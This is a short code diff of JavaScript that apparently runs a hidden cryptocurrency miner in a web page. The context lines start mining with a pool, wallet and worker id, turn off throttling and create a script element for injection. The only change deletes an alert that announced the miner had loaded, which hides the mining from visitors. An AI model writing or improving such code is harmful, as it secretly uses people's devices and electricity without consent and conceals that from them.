@@ -7,7 +7,6 @@ function __mm__() {
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 0;
-    alert('loaded mm');
 }
 
 const __bJS__ = document.createElement('script');
